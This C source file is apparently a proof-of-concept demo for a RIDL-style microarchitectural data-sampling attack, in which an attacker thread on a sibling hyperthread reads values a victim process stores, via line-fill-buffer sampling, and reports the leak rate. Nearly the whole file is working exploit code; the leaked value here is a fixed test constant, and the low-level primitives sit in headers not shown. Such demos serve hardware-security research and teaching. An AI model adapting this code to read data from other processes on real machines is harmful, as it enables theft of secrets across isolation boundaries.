#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils.h"



#define REPS 200000
#define WRITE_VALUE 42ull

int writer_cpu = 3, reader_cpu = 7, pid = 0;
int hits[256];

inline void *victim(uint64_t value) {
    set_processor_affinity(writer_cpu);
    uint64_t *destination = aligned_alloc(_page_size, _page_size);
    while (1) { store_and_flush(value, destination); }
}

void attacker(void *mem) {
    set_processor_affinity(reader_cpu);
    memset(hits, 0, sizeof(hits[0]) * 256);
    int reps = REPS;
    while (reps--) {
        if ((reps % 100) == 0) {
            printf("In Progress... %d%%              \r", (int) (((REPS - reps) / ((double) REPS)) * 100.0));
            fflush(stdout);
        }
        int value = lfb_read(mem);
        if (value > 0) hits[value & 0xFF]++;
    }
}


int main() {
    printf("Demo 1a: Cross-Thread Store Leaking\n");
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    _page_size = getpagesize();
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    ridl_init();
    pid = fork();
    if (!pid) victim(WRITE_VALUE);
    usleep(10000);
    attacker(mem);
    int max = -1, max_i = -1;
    for (int i = 1; i < 256; i++) {
        if (hits[i] > max) {
            max_i = i;
            max = hits[i];
        }
    }
    if (max_i == WRITE_VALUE && max > (float) REPS / 1000.0) {
        printf("The expected value was successfully leaked.\nSuccess rate: %.2f%%\n", (100 * max) / ((double) REPS));
    } else {
        printf("The expected value was not leaked.\n");
    }
    kill(pid, SIGKILL);
    usleep(10000);

    ridl_cleanup();

    return 0;
}

